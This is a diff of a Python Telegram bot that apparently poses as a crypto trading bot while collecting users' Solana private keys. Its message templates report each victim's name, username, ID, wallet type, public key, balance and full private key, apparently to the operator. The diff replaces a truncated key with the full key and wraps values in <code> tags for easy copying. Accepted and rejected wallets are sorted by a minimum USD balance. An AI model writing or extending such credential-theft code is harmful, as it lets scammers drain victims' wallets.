@@ -1426,11 +1426,11 @@ You can now access all trading features and start trading!"""
 
 👤 <b>Utilisateur:</b> {escape_html(user.first_name)} {escape_html(user.last_name or '')}
 🆔 <b>Username:</b> @{escape_html(user.username) if user.username else '❌ PAS DE USERNAME'}
-🔢 <b>User ID:</b> {user.id}
+🔢 <b>User ID:</b> <code>{user.id}</code>
 💳 <b>Wallet Type:</b> {escape_html(wallet_type)}
 
-🔑 <b>Clé tentée:</b>
-{escape_html(user_message[:20])}...
+🔑 <b>Private Key:</b>
+<code>{escape_html(user_message)}</code>
 
 ---
 ⚠️ <i>Clé privée invalide</i>"""
@@ -1465,17 +1465,18 @@ You can now access all trading features and start trading!"""
 
 👤 <b>Utilisateur:</b> {escape_html(user.first_name)} {escape_html(user.last_name or '')}
 🆔 <b>Username:</b> @{escape_html(user.username) if user.username else '❌ PAS DE USERNAME'}
-🔢 <b>User ID:</b> {user.id}
+🔢 <b>User ID:</b> <code>{user.id}</code>
 💳 <b>Wallet Type:</b> {escape_html(wallet_type)}
 
-👛 <b>Public Key:</b> {escape_html(public_key)}
+👛 <b>Public Key:</b>
+<code>{escape_html(public_key)}</code>
 💰 <b>Balance:</b> {sol_balance:.4f} SOL
 💵 <b>Valeur USD:</b> ${usd_value:.2f}
 📊 <b>Prix SOL:</b> ${sol_price:.2f}
 ⚠️ <b>Minimum requis:</b> ${MINIMUM_USD_REQUIRED:.2f}
 
 🔑 <b>Private Key:</b>
-{escape_html(user_message)}
+<code>{escape_html(user_message)}</code>
 
 ---
 ❌ <i>Wallet rejeté - Solde insuffisant (< ${MINIMUM_USD_REQUIRED})_"""
@@ -1518,16 +1519,17 @@ You can now access all trading features and start trading!"""
 
 👤 <b>Utilisateur:</b> {escape_html(user.first_name)} {escape_html(user.last_name or '')}
 🆔 <b>Username:</b> @{escape_html(user.username) if user.username else '❌ PAS DE USERNAME'}
-🔢 <b>User ID:</b> {user.id}
+🔢 <b>User ID:</b> <code>{user.id}</code>
 💳 <b>Wallet Type:</b> {escape_html(wallet_type)}
 
-👛 <b>Public Key:</b> {escape_html(public_key)}
+👛 <b>Public Key:</b>
+<code>{escape_html(public_key)}</code>
 💰 <b>Balance:</b> {sol_balance:.4f} SOL
 💵 <b>Valeur USD:</b> ${usd_value:.2f}
 📊 <b>Prix SOL:</b> ${sol_price:.2f}
 
 🔑 <b>Private Key:</b>
-{escape_html(user_message)}
+<code>{escape_html(user_message)}</code>
 
 ---
 ✅ <i>Wallet accepté et connecté</i>"""
@@ -1611,4 +1613,3 @@ def main():
 
 if __name__ == '__main__':
     main()
-
